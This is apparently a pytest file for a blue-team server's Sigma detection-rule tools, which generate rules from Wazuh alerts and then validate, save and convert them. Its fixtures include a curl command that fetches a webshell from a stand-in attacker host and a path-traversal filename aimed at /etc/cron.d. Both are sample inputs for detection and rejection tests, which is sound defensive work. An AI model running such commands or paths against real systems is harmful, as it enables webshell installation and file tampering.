#!/usr/bin/env python3
"""
© NAuliajati - TangerangKota-CSIRT
Tests for mcp_server.tools.sigma_rules.
Pure pipeline (harvest, ranking, render, schema checks) is tested without any
network. The two API-touching paths (Indexer harvest, Manager existing-rule
lookup) are tested with the shared httpx mock, and the tools are plain async
functions that are awaited directly.
"""
from __future__ import annotations
import asyncio
import json
import os
import re
from pathlib import Path
import pytest
import yaml

# Env must be set before mcp_server is imported.
os.environ.setdefault("WAZUH_INDEXER_URL", "https://indexer:9200")
os.environ.setdefault("WAZUH_INDEXER_PASSWORD", "test-indexer-pass")
os.environ.setdefault("WAZUH_API_URL", "https://manager:55000")
os.environ.setdefault("WAZUH_API_PASSWORD", "test-manager-pass")
os.environ.setdefault("BLUETEAM_REDACTION_POLICY", "full")

# httpx is imported for type parity with tests/test_yara_rules.py
import httpx  # noqa: F401


def _run(coro):
    return asyncio.get_event_loop_policy().new_event_loop().run_until_complete(coro)


def _module():
    from mcp_server.tools import sigma_rules as sr
    return sr


_ALERT_DOCS = [
    {"data": {"url": "http://evil.example.com/shell.php",
              "domain": "evil.example.com",
              "command": "curl http://evil.example.com/shell.php"},
     "rule": {"id": "5710", "level": 10, "description": "Attempt to upload webshell",
              "groups": ["web", "attack"], "mitre": {"id": ["T1505.003"]}},
     "decoder": {"name": "web-accesslog"}},
    {"data": {"url": "http://evil.example.com/shell.php?id=1",
              "domain": "evil.example.com"},
     "rule": {"id": "5710", "level": 8, "groups": ["web"]},
     "decoder": {"name": "web-accesslog"}},
]

_VALID_RULE = """title: Wazuh url pattern test rule
id: 4f2a9c1e-1111-2222-3333-444455556666
status: experimental
description: test
author: Test
date: "2026-01-01"
tags:
  - attack.t1505.003
logsource:
  product: wazuh
  category: webserver
detection:
  selection:
    data.url|contains: "/shell.php"
  condition: selection
falsepositives:
  - Unknown
level: high
"""


# Pure pipeline
def test_harvest_drops_generic_values_and_caps():
    sr = _module()
    docs = [{"data": {"domain": "index"}}, {"data": {"domain": "a.example.com"}}]
    assert sr._harvest_values(docs).get("data.domain") == ["a.example.com"]

    many = [{"data": {"domain": f"h{i}.example.com"}} for i in range(20)]
    assert len(sr._harvest_values(many)["data.domain"]) == sr._MAX_VALUES_PER_FIELD


def test_harvest_is_deterministic_and_deduped():
    sr = _module()
    a = sr._harvest_values(_ALERT_DOCS)
    b = sr._harvest_values(list(_ALERT_DOCS))
    assert a == b, "same input order must give the same output"
    assert a["data.domain"] == ["evil.example.com"]
    assert len(a["data.url"]) == 2, "distinct URLs are kept, no duplicates"
    assert sr._harvest_values(_ALERT_DOCS + _ALERT_DOCS)["data.url"] == a["data.url"]
    # Doc order may change value order, but never the value set.
    assert set(sr._harvest_values(list(reversed(_ALERT_DOCS)))["data.url"]) == set(a["data.url"])


def test_single_character_value_rejected():
    sr = _module()
    assert not sr._is_usable_value("//////")
    assert sr._is_usable_value("/shell.php")


def test_level_derived_from_max_wazuh_rule_level():
    sr = _module()
    assert sr._derive_level(_ALERT_DOCS) == "high"           # max level 10
    assert sr._derive_level([{"rule": {"level": 15}}]) == "critical"
    assert sr._derive_level([{"rule": {"level": 1}}]) == "informational"
    assert sr._derive_level([]) == "medium", "no level data must default, not crash"


def test_category_derived_from_decoder_then_default():
    sr = _module()
    assert sr._derive_category(_ALERT_DOCS, None) == "webserver"
    assert sr._derive_category([{"rule": {}}], None) == "application"
    assert sr._derive_category(_ALERT_DOCS, "custom-cat") == "custom-cat"


def test_tags_derived_from_mitre_ids_only():
    sr = _module()
    docs = [{"rule": {"mitre": {"id": ["T1505.003", "garbage", "T1071"]}}},
            {"rule": {"mitre": {"id": "T1046"}}}]
    assert sr._derive_tags(docs) == ["attack.t1046", "attack.t1071", "attack.t1505.003"]


def test_render_produces_named_selection_and_valid_schema():
    sr = _module()
    params = sr.SigmaRuleGenerateInput(mode="alert", srcip="203.0.113.9")
    src, diag = sr._build_rule(_ALERT_DOCS, params, sr._harvest_values(_ALERT_DOCS))
    doc = yaml.safe_load(src)

    # Sigma structure: fields live under a named selection group.
    assert set(doc["detection"]) == {"selection", "condition"}
    assert doc["detection"]["condition"] == "selection"
    assert "data.url|contains" in doc["detection"]["selection"]
    assert doc["logsource"] == {"product": "wazuh", "category": "webserver"}
    assert doc["status"] == "experimental"
    assert doc["level"] == "high"
    assert "attack.t1505.003" in doc["tags"]
    assert sr._static_checks(doc) == [], sr._static_checks(doc)
    assert diag["source_rule_ids"] == ["5710"]


def test_render_is_deterministic_apart_from_uuid():
    sr = _module()
    params = sr.SigmaRuleGenerateInput(mode="alert", srcip="203.0.113.9")
    a, _ = sr._build_rule(_ALERT_DOCS, params, sr._harvest_values(_ALERT_DOCS))
    b, _ = sr._build_rule(_ALERT_DOCS, params, sr._harvest_values(_ALERT_DOCS))
    strip = lambda s: re.sub(r"^id: .*$", "id: X", s, flags=re.MULTILINE)  # noqa: E731
    assert strip(a) == strip(b)


def test_no_values_yields_placeholder_not_empty_detection():
    sr = _module()
    params = sr.SigmaRuleGenerateInput(mode="alert", srcip="10.0.0.1")
    src, diag = sr._build_rule([{"rule": {"level": 3}}], params, {})
    assert diag["selections"] == {}
    doc = yaml.safe_load(src)
    assert doc["detection"]["condition"] == "selection"
    assert "__NO_ATTACKER_VALUE_HARVESTED__" in src


def test_static_checks_fire_on_broken_rule():
    sr = _module()
    doc = yaml.safe_load("title: short\nlogsource: {}\ndetection:\n  condition: missing_sel\n")
    findings = " ".join(sr._static_checks(doc))
    assert "SG1" in findings, findings     # title too short
    assert "SG6" in findings, findings     # logsource empty
    assert "SG7" in findings, findings     # condition references undefined selection


def test_static_checks_report_unmapped_fields():
    sr = _module()
    doc = yaml.safe_load(_VALID_RULE)
    findings = " ".join(sr._static_checks(doc, ["data.url"]))
    assert "SG9" in findings and "data.url" in findings


def test_schema_check_rejects_non_mapping():
    sr = _module()
    doc, errors = sr._schema_of("- just\n- a list\n")
    assert doc is None and errors


# Validate tool
def test_validate_passes_good_rule():
    sr = _module()
    out = json.loads(_run(sr.blueteam_sigma_rule_validate(
        sr.SigmaRuleValidateInput(rule_source=_VALID_RULE, response_format="json"))))
    assert out["valid"] is True
    assert out["errors"] == []
    assert out["rule_title"] == "Wazuh url pattern test rule"
    assert out["engine"] in ("schema-only", "schema+pysigma")


def test_validate_fails_on_broken_yaml():
    sr = _module()
    out = json.loads(_run(sr.blueteam_sigma_rule_validate(
        sr.SigmaRuleValidateInput(rule_source="title: [unclosed", response_format="json"))))
    assert out["valid"] is False
    assert any("YAML" in e for e in out["errors"])


def test_validate_error_on_warning_promotes_findings():
    sr = _module()
    bad = "title: Wazuh rule without required keys\nlogsource:\n  product: wazuh\n" \
          "detection:\n  selection:\n    data.url: x\n  condition: selection\n"
    ok = json.loads(_run(sr.blueteam_sigma_rule_validate(
        sr.SigmaRuleValidateInput(rule_source=bad, response_format="json"))))
    assert ok["valid"] is True and ok["findings"], "findings alone must not fail validation"

    strict = json.loads(_run(sr.blueteam_sigma_rule_validate(
        sr.SigmaRuleValidateInput(rule_source=bad, error_on_warning=True,
                                  response_format="json"))))
    assert strict["valid"] is False


def test_validate_never_claims_pysigma_when_absent(monkeypatch):
    sr = _module()
    monkeypatch.setattr(sr, "_pysigma_available", lambda: False)
    out = json.loads(_run(sr.blueteam_sigma_rule_validate(
        sr.SigmaRuleValidateInput(rule_source=_VALID_RULE, response_format="json"))))
    assert out["pysigma_available"] is False
    assert out["engine"] == "schema-only"


# Generate tool, alert mode against a mocked Indexer + Manager
def test_generate_alert_mode_harvests_and_verifies(monkeypatch):
    sr = _module()
    captured = {}

    async def fake_post(body, index_pattern=None):
        captured["body"] = body
        return {"hits": {"hits": [{"_source": d} for d in _ALERT_DOCS]}}

    async def fake_field_caps(fields, index_pattern=None):
        captured["fields"] = fields
        return {f: "keyword" for f in fields}

    async def fake_existing(docs):
        captured["existing_docs"] = len(docs)
        return [{"id": "5710", "description": "Attempt to upload webshell",
                 "level": 10, "groups": ["web"]}]

    monkeypatch.setattr("mcp_server.wazuh.indexer._wazuh_indexer_post", fake_post)
    monkeypatch.setattr(sr, "_wazuh_indexer_field_caps", fake_field_caps)
    monkeypatch.setattr(sr, "_existing_rule_matches", fake_existing)

    out = json.loads(_run(sr.blueteam_sigma_rule_generate(
        sr.SigmaRuleGenerateInput(mode="alert", srcip="203.0.113.9",
                                  response_format="json"))))
    assert out["coverage"] == "draft"
    assert out["validation"]["valid"] is True
    assert out["diagnostics"]["logsource_category"] == "webserver"
    assert out["existing_rules"][0]["id"] == "5710"
    assert out["unmapped_fields"] == []
    assert captured["existing_docs"] == 2
    # full_log must never be part of the working set.
    assert "full_log" not in captured["body"]["_source"]
    assert out["field_coverage"]["data.url"] == 2


def test_generate_reports_unmapped_fields_as_sg9(monkeypatch):
    sr = _module()

    async def fake_post(body, index_pattern=None):
        return {"hits": {"hits": [{"_source": d} for d in _ALERT_DOCS]}}

    async def fake_field_caps(fields, index_pattern=None):
        return {"data.url": "keyword"}          # data.domain is NOT mapped

    monkeypatch.setattr("mcp_server.wazuh.indexer._wazuh_indexer_post", fake_post)
    monkeypatch.setattr(sr, "_wazuh_indexer_field_caps", fake_field_caps)
    monkeypatch.setattr(sr, "_existing_rule_matches", lambda docs: _empty())

    out = json.loads(_run(sr.blueteam_sigma_rule_generate(
        sr.SigmaRuleGenerateInput(mode="alert", srcip="203.0.113.9",
                                  response_format="json"))))
    assert "data.domain" in out["unmapped_fields"]
    assert any("SG9" in f for f in out["findings"])


async def _empty():
    return []


def test_generate_raises_when_no_alerts_match(monkeypatch):
    """@blueteam_tool renders the typed exception as an error payload."""
    sr = _module()

    async def fake_post(body, index_pattern=None):
        return {"hits": {"hits": []}}

    monkeypatch.setattr("mcp_server.wazuh.indexer._wazuh_indexer_post", fake_post)
    out = json.loads(_run(sr.blueteam_sigma_rule_generate(
        sr.SigmaRuleGenerateInput(mode="alert", srcip="10.0.0.1",
                                  response_format="json"))))
    assert "error" in out and out["type"] == "BlueTeamMCPError"
    assert "No alerts matched" in out["error"]


def test_generate_text_mode_needs_no_network(monkeypatch):
    sr = _module()
    out = json.loads(_run(sr.blueteam_sigma_rule_generate(
        sr.SigmaRuleGenerateInput(mode="text",
                                  text="curl http://evil.example.com/shell.php -o /tmp/x",
                                  response_format="json"))))
    assert out["coverage"] == "draft"
    assert "evil.example.com" in out["rule_source"]
    assert out["existing_rules"] == []
    assert out["field_coverage"] is None


def test_generate_input_validation():
    sr = _module()
    with pytest.raises(Exception):
        sr.SigmaRuleGenerateInput(mode="alert")           # needs srcip or rule_id
    with pytest.raises(Exception):
        sr.SigmaRuleGenerateInput(mode="text")            # needs text
    with pytest.raises(Exception):
        sr.SigmaRuleGenerateInput(mode="file")            # not a Stage A mode


# Save tool
def test_save_writes_and_refuses_overwrite(tmp_path, monkeypatch):
    sr = _module()
    monkeypatch.setattr(sr, "_rules_dir", lambda: tmp_path)
    payload = json.loads(_run(sr.blueteam_sigma_rule_save(
        sr.SigmaRuleSaveInput(rule_source=_VALID_RULE, filename="my_rule.yml",
                              response_format="json"))))
    assert payload["saved"] is True
    assert Path(payload["path"]).exists()
    assert Path(payload["path"]).suffix == ".yml"

    dup = json.loads(_run(sr.blueteam_sigma_rule_save(
        sr.SigmaRuleSaveInput(rule_source=_VALID_RULE, filename="my_rule.yml",
                              response_format="json"))))
    assert "error" in dup and dup["type"] == "BlueTeamMCPError"

    again = json.loads(_run(sr.blueteam_sigma_rule_save(
        sr.SigmaRuleSaveInput(rule_source=_VALID_RULE, filename="my_rule.yml",
                              overwrite=True, response_format="json"))))
    assert again["saved"] is True


def test_save_rejects_traversal_and_wrong_extension(tmp_path, monkeypatch):
    sr = _module()
    monkeypatch.setattr(sr, "_rules_dir", lambda: tmp_path)
    for bad in ("../../etc/cron.d/x.yml", "x.yar"):
        out = json.loads(_run(sr.blueteam_sigma_rule_save(
            sr.SigmaRuleSaveInput(rule_source=_VALID_RULE, filename=bad,
                                  response_format="json"))))
        assert "error" in out, bad
    assert list(tmp_path.iterdir()) == []


def test_save_rejects_missing_required_keys(tmp_path, monkeypatch):
    sr = _module()
    monkeypatch.setattr(sr, "_rules_dir", lambda: tmp_path)
    out = json.loads(_run(sr.blueteam_sigma_rule_save(
        sr.SigmaRuleSaveInput(rule_source="title: Wazuh only a title here\n",
                              response_format="json"))))
    assert "error" in out
    assert list(tmp_path.iterdir()) == [], "nothing may be written on refusal"


def test_save_derives_filename_from_title(tmp_path, monkeypatch):
    sr = _module()
    monkeypatch.setattr(sr, "_rules_dir", lambda: tmp_path)
    payload = json.loads(_run(sr.blueteam_sigma_rule_save(
        sr.SigmaRuleSaveInput(rule_source=_VALID_RULE, response_format="json"))))
    name = Path(payload["path"]).name
    assert name.startswith("sigma_Wazuh_url_pattern_test_rule_") and name.endswith(".yml")


# Convert tool. Skipped when the optional pySigma dependency is absent.
from mcp_server.sigma import engine as sigma_engine  # noqa: E402

_needs_pysigma = pytest.mark.skipif(not sigma_engine.available(),
                                    reason="pySigma not installed")


class TestSigmaFieldExtraction:
    """Pure helper runs without pySigma."""

    def test_field_names_strips_modifiers_and_walks_nested(self):
        src = ("title: t\nlogsource:\n  product: wazuh\ndetection:\n"
               "selection:\n    data.url|contains: x\n    data.srcip|cidr: 10.0.0.0/8\n"
               "filter:\n    Image|endswith: cmd.exe\n  condition: selection and not filter\n")
        assert sigma_engine.field_names(src) == ["data.url", "data.srcip", "Image"]

    def test_field_names_tolerates_garbage(self):
        assert sigma_engine.field_names("not: [valid") == []
        assert sigma_engine.field_names("title: t\n") == []

    def test_default_field_map_is_plain_renames(self):
        assert all("|" not in k for k in sigma_engine.DEFAULT_FIELD_MAP)
        assert sigma_engine.DEFAULT_FIELD_MAP["CommandLine"] == "data.command"


def test_convert_without_pysigma_returns_install_hint(monkeypatch):
    sr = _module()
    monkeypatch.setattr(sr.sigma_engine, "_load", lambda: None)
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, response_format="json"))))
    assert "error" in out
    assert out["type"] == "SigmaEngineUnavailable", "the concrete subclass is reported"
    assert "pySigma is not installed" in out["error"]


def test_convert_rejects_unparseable_rule():
    sr = _module()
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source="title: [unclosed", response_format="json"))))
    assert "error" in out


@_needs_pysigma
def test_convert_lucene_and_dsl():
    sr = _module()
    lucene = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, output_format="lucene",
                                 verify_fields=False, response_format="json"))))
    assert isinstance(lucene["queries"][0], str)
    assert "shell.php" in lucene["queries"][0]
    assert lucene["index_pattern"] == "wazuh-alerts-*"

    dsl = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, output_format="dsl",
                                 verify_fields=False, response_format="json"))))
    assert "query" in dsl["queries"][0]


@_needs_pysigma
def test_convert_monitor_targets_wazuh_index():
    sr = _module()
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, output_format="monitor",
                                 monitor_interval=9, verify_fields=False,
                                 response_format="json"))))
    mon = out["queries"][0]
    assert mon["inputs"][0]["search"]["indices"] == ["wazuh-alerts-*"]
    assert mon["schedule"]["period"]["interval"] == 9
    assert "beats-*" not in json.dumps(mon)


@_needs_pysigma
def test_convert_saved_search_is_retargeted():
    """Regression: upstream hardcodes beats-* in kibana_ndjson (ignores index_names)."""
    sr = _module()
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, output_format="saved_search",
                                 verify_fields=False, response_format="json"))))
    saved = out["queries"][0]
    assert "beats-*" not in json.dumps(saved)
    assert out["index_retargeted"] is True
    inner = json.loads(saved["attributes"]["kibanaSavedObjectMeta"]["searchSourceJSON"])
    assert inner["index"] == "wazuh-alerts-*"
    assert saved["references"][0]["id"] == "wazuh-alerts-*"


@_needs_pysigma
def test_convert_reports_failed_retarget_instead_of_failing_open(monkeypatch):
    """A changed upstream payload shape must surface, not pass silently."""
    sr = _module()
    monkeypatch.setattr(sr.sigma_engine, "_retarget_saved_search", lambda item, idx: False)
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, output_format="saved_search",
                                 verify_fields=False, response_format="json"))))
    assert out["index_retargeted"] is False

    md = _run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, output_format="saved_search",
                                 verify_fields=False)))
    assert "index retarget failed" in md, md[:400]


def test_retarget_helper_returns_false_on_shape_change():
    """Pure helper: no pySigma needed."""
    r = sigma_engine._retarget_saved_search
    ok = {"attributes": {"kibanaSavedObjectMeta": {"searchSourceJSON": '{"index": "beats-*"}'}},
          "references": [{"name": "kibanaSavedObjectMeta.searchSourceJSON.index",
                          "id": "beats-*"}]}
    assert r(ok, "wazuh-alerts-*") is True
    assert json.loads(ok["attributes"]["kibanaSavedObjectMeta"]["searchSourceJSON"]
                      )["index"] == "wazuh-alerts-*"
    assert ok["references"][0]["id"] == "wazuh-alerts-*"

    assert r({"attributes": {"kibanaSavedObjectMeta": {"searchSourceJSON": "not json"}}},
             "wazuh-alerts-*") is False
    assert r({"attributes": {"kibanaSavedObjectMeta": {"searchSourceJSON": '{"filter": []}'}}},
             "wazuh-alerts-*") is False, "no index key must not be invented"
    assert r({"attributes": {}}, "wazuh-alerts-*") is False
    assert r("not a dict", "wazuh-alerts-*") is False


def test_index_retargeted_true_for_non_saved_search_formats():
    """monitor honours index_names by construction, so it is never a retarget risk."""
    sr = _module()
    if not sigma_engine.available():
        pytest.skip("pySigma not installed")
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=_VALID_RULE, output_format="monitor",
                                 verify_fields=False, response_format="json"))))
    assert out["index_retargeted"] is True


@_needs_pysigma
def test_convert_applies_wazuh_field_map():
    sr = _module()
    win = ("title: Windows image rule to map\nid: 4f2a9c1e-1111-2222-3333-444455556670\n"
           "status: experimental\nlogsource:\n  product: windows\n"
           "detection:\n  selection:\n    Image|endswith: '\\\\cmd.exe'\n"
           "  condition: selection\nlevel: high\n")
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=win, output_format="lucene",
                                 verify_fields=False, response_format="json"))))
    assert "data.win.eventdata.image" in out["queries"][0]
    assert out["fields"] == ["data.win.eventdata.image"]


@_needs_pysigma
def test_convert_marks_unmapped_fields(monkeypatch):
    sr = _module()

    async def fake_caps(fields, index_pattern=None):
        return {"data.url": "keyword"}

    monkeypatch.setattr(sr, "_wazuh_indexer_field_caps", fake_caps)
    cidr_rule = _VALID_RULE.replace('data.url|contains: "/shell.php"',
                                    "data.url|contains: \"/shell.php\"\n    data.srcip|cidr: 10.0.0.0/8")
    out = json.loads(_run(sr.blueteam_sigma_rule_convert(
        sr.SigmaRuleConvertInput(rule_source=cidr_rule, output_format="lucene",
                                 response_format="json"))))
    assert out["unmapped_fields"] == ["data.srcip"]


def test_convert_defaults_come_from_config():
    sr = _module()
    from mcp_server.core.config import config as cfg
    assert cfg.sigma.index_pattern == "wazuh-alerts-*"
    assert 1 <= cfg.sigma.monitor_interval <= 1440
